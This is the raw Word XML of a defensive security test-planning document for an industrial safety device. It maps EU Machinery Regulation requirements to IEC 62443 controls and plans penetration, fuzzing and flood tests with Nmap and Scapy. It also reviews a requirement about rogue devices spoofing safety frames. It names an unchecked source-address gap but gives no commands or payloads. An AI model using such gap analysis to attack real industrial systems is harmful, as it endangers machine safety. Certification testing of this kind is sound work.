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F015" w14:textId="5B133D99" w:rsidR="00106294" w:rsidRPr="00106294" w:rsidRDefault="00106294" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00106294">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>WORKFLOW</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69E05FCD" w14:textId="77777777" w:rsidR="00106294" w:rsidRDefault="00106294" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7712D1D2" w14:textId="2029424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>Step 1: Critical Review &amp; Theoretical Validation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2808542F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>- Requirement &amp; Mapping: Review my mapping from the EU Machinery Regulation to the IEC 62443-4-2 Component Requirement (CR). Is it accurate and complete? Correct it if necessary.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62926251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>- Assets &amp; STRIDE: Evaluate my identified Target Assets and STRIDE threats. Are they plausible for this specific device and requirement? Add missing threats or correct misalignments.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24D2B610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 xml:space="preserve">- Security Functions &amp; Gaps: Cross-reference my identified Security Functions and Gaps with the device documentation you were provided. Are the mitigations accurately described? Are the identified gaps realistic? </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="429F4839" w14:textId="77777777" w:rsidR="00106294" w:rsidRPr="00106294" w:rsidRDefault="00106294" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="73A28653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>Step 2: Methodological Test Planning</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D081344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>- Based on the validated Security Functions and Gaps, derive concrete test scenarios to verify the mitigations or prove the gaps.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79D7EDF1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>- Scientific Justification: Justify the chosen test methods using established technical guidelines (e.g., NIST SP 800-115 for network/port scanning, MITRE ATT&amp;CK for ICS for active exploitation/sniffing, or OWASP for the IoT-Core web interface).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BD03960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>- IEC 62443-4-1 Categorization (SVV): Assign each test to the correct SVV category:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E35F769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 xml:space="preserve">  * SVV-1 (Requirements-based Testing): Verifying functional implementation in normal operation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67614165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 xml:space="preserve">  * SVV-2 (Threat Mitigation Testing): Verifying the effectiveness of countermeasures under attack/fault conditions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1916C01F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 xml:space="preserve">  * SVV-3 (Vulnerability Testing): Searching for known vulnerabilities or open attack surface (e.g., Nmap).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18D5257A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 xml:space="preserve">  * SVV-4 (Penetration Testing): Active exploitation or protocol manipulation (e.g., </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00106294">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Scapy</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00106294">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, Fuzzing).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="440B8659" w14:textId="77777777" w:rsidR="00106294" w:rsidRPr="00106294" w:rsidRDefault="00106294" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="092DD3AF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>Step 3: Two-Level Test Catalog Generation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E1EA1C3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>Generate the final test catalog entries for the planned tests. Each test must be structured in two levels:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="383090BB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 xml:space="preserve">- Level 1: Abstract Test Scenario (Product-neutral). </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A2D1613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 xml:space="preserve">  Must include: Test Case ID, Traceability (RQ -&gt; CR -&gt; Asset), Target Threat, SVV Category, Test Objective, Abstract Test Steps, and strict Pass/Fail Criteria.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EB49CF5" w14:textId="77777777" w:rsidR="00106294" w:rsidRPr="00106294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 xml:space="preserve">- Level 2: Concrete Test Execution (Specific to my test environment). </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41CABC10" w14:textId="21F65CD7" w:rsidR="004117CC" w:rsidRDefault="00106294" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00106294">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">  Must include: Referenced Test Case ID, Hardware/Network Setup (Kali, Pi, Target IPs), Concrete Tools (Nmap, Wireshark, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00106294">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Scapy</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00106294">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, etc.), Specific Commands/Scripts to be executed, and placeholders for the Result and Evidence (e.g., PCAP, XML logs).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A3CAB71" w14:textId="77777777" w:rsidR="0047270E" w:rsidRDefault="0047270E" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C5AC76E" w14:textId="77777777" w:rsidR="0047270E" w:rsidRDefault="0047270E" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1CE29558" w14:textId="77777777" w:rsidR="0047270E" w:rsidRDefault="0047270E" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6B5BE3E1" w14:textId="77777777" w:rsidR="0047270E" w:rsidRDefault="0047270E" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="64FF141D" w14:textId="77777777" w:rsidR="0047270E" w:rsidRDefault="0047270E" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08246ECD" w14:textId="77777777" w:rsidR="0047270E" w:rsidRDefault="0047270E" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46EEA15B" w14:textId="77777777" w:rsidR="0047270E" w:rsidRDefault="0047270E" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F478009" w14:textId="77777777" w:rsidR="0047270E" w:rsidRDefault="0047270E" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="26436A41" w14:textId="77777777" w:rsidR="0047270E" w:rsidRDefault="0047270E" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40C515BA" w14:textId="012DD875" w:rsidR="00C1714F" w:rsidRPr="00C1714F" w:rsidRDefault="00C1714F" w:rsidP="00DB074F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lastRenderedPageBreak/>
        <w:t>REQUIREMENT 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="090CB1CC" w14:textId="77777777" w:rsidR="00C1714F" w:rsidRDefault="00C1714F" w:rsidP="00DB074F">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0ADC4E25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>RQ-001 — Reprocessed (Scope-Corrected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40AE9751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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Correction applied:</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Rechecking RQ-001 against the scope-boundary discipline now established across RQ-002/004/005, I found </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>one threat-without-a-CR inconsistency</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">one test that belongs to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>neighbouring</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> requirements</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04EFC8E9" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>DoS threat (over-reach).</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> In my original RQ-001 I </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>added</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Denial of Service</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> to the STRIDE profile — but I never mapped a DoS CR (no CR 7.1) to back it, so the threat floated without a control. More importantly, </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>generalized flooding/DoS resilience is the substance of RQ-010</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> ("withstand reasonably foreseeable malicious attempts"). RQ-001 is narrower: </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>the connection and communication of another device does not lead to a hazardous situation</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — i.e., a </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>rogue/additional device that connects and speaks</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Spoofing + Tampering of the safety frames), not flooding-in-general. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0006297D">
        <w:t>DoS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0006297D">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0006297D">
        <w:t>is</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0006297D">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0006297D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>demoted</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0006297D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0006297D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>to</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0006297D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0006297D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>cross-reference</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0006297D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0006297D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>to</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0006297D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-010</w:t>
      </w:r>
      <w:r w:rsidRPr="0006297D">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DFB34E2" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>DCP flood test (scope creep).</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> My planned </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TS-5 (DCP set/reset flood)</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> straddles </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-011</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (unauthenticated DCP = authorization — where I later made it the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>centrepiece</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, TC-RQ011-02) and </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-010</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (flooding). </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0006297D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Removed</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0006297D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0006297D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>from</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0006297D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-001</w:t>
      </w:r>
      <w:r w:rsidRPr="0006297D">
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0006297D">
        <w:t>cross-referenced</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0006297D">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2928C2AE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What survives is the tight, correct RQ-001 core: </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>a connecting device that communicates cannot drive the safety function into a hazardous state</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — protected by </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>F_Dest_Add</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> + 4-byte CRC + </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>F_WD_Time</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> watchdog</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, with the </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">unchecked </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>F_Source_Add</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> / firewall-assumption</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> as the residual gap.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BC15B5D" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="0006297D">
        <w:pict w14:anchorId="61F56DC5">
          <v:rect id="_x0000_i1352" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="63DAC391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>Step 1 — Critical Review &amp; Theoretical Validation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A8D8823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>1.1 Requirement &amp; CR Mapping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02AC873A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EU Machinery Regulation (EU) 2023/1230, Annex III </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EHSR 1.1.9</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>the connection of another device, including any remote device that communicates with it, does not lead to a hazardous situation.</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> This is an </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>integrity + device-authenticity</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> requirement about a </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>connecting communication partner</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, and it is </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>outcome-based</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> ("does not lead to a hazardous situation") — so success = the connecting device's frames are </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>rejected or resolve to the safe state</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6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870"/>
        <w:gridCol w:w="1129"/>
        <w:gridCol w:w="4869"/>
      </w:tblGrid>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="5DF97F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CC6DC0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9B22A3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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Your</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D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8CA76C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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D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FFBCC4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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Correction</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="00AD42B6" w14:paraId="2E612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FF21C" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D">
              <w:t>CR 3.1 – Communication Integrity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7EF7E" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="000629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B8E03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Correct</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:rPr>
                <w:b/>
                <w:bCs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3EFBF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Keep. </w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Add RE(1) Communication Authentication</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> — the*"connection of another device that communicates"* is fundamentally an authenticity question (is this the legitimate F-Host or a rogue partner?).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="00AD42B6" w14:paraId="6F2DA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62B0B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 xml:space="preserve">CR 1.2 – I&amp;A </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>of</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>devices</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>processes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E2CEB" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> (I </w:t>
            </w:r>
